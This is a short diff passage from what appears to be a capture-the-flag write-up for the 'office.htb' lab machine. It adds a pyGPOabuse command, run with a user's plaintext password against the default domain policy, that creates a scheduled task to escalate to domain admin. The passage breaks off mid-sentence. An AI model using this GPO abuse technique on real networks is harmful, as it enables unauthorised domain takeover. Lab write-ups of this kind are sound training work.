@@ -951,3 +951,10 @@ The current user has GenericWrite over the default domain policy
 
 I can use pyGPOabuse to get to domain admin!
 
+```python
+python3 pygpoabuse.py 'office.htb'/'hhogan':'H4ppyFtW183#'  -gpo-id '31B2F340-016D-11D2-945F-00C04FB984F9' -f
+[+] ScheduledTask TASK_bdfa12c1 created!
+```
+This created a task
+
+And since the user is part of 
